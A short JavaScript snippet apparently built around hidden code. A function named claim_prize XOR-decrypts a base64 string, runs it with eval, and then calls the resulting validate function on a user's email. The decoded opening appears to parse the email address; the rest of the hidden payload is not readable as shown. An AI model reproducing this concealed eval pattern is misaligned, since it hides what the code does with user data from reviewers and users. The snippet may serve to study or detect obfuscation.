let validate = "GXJgeHRscHV1PGt/c0lFQ1dBDUNKSUBGAgxWJA8QERJQW1tFQxhJW0lITh4CYCQvIi0paDQ4JSM/ZGoOaHlqWHN0dXY+PnEqOi4pLXEMBAwEEA1GRlVJWEJMFmRPUFFSU1RVVgUdDQ8JEl1ORIqhoqOk+IynqKmq6OPj/fuw5OH25rWrt+j46O/vxq7Cm6uCg4SFxcjG2t6LxMLd25CMksPVx8LE44jngLadnp/gqKTrrKq1s+jo9+vuvq+ktaO6tqCmpbr2qr/59f2l1cDBwsPExcbHmoyenp6Dzt/L+9LT1NWL/djZ2tuVm9aKc2RwLXdxZ3V8el1ieGUmLUNCX2g2PDYxPjlvaHlvMHpORVF0TVFODwpUCAIFDVUlEBESExQVFhdbVlRISB1XUS4kMGN5ZTM0LTtkODkvPTsiODw0fGF6dy0qPylyMTsxBxUKQ0lFV05TY0pLTE1OT1BRGxVcHBgZHQtaWkFdXAiw9t31tent4ubW5f3p//zu4/r8+vryt7WxueGRvL2+v4CBgoOEhYaH2sze3t7Djp6Lu5KTlJWWl5iZx7GcnZ6f4OHi47agsrK6p+r598fu7/Dxr9n09fb3qryurq6z/u/b65/p";


function decrypt(obfuscated_b64) {
    const obfuscated = atob(obfuscated_b64);
    let deobfuscated = "";
    let key = 0x13;
    for(let i = 0; i < obfuscated.length; i++) {
        const code = obfuscated.charCodeAt(i);
        deobfuscated += String.fromCharCode(code ^ key);
        key = (key + 1) & 0xFF;
    }
    return deobfuscated;
}


function claim_prize(email) {
    eval(decrypt(validate));
    return validate(email);
}
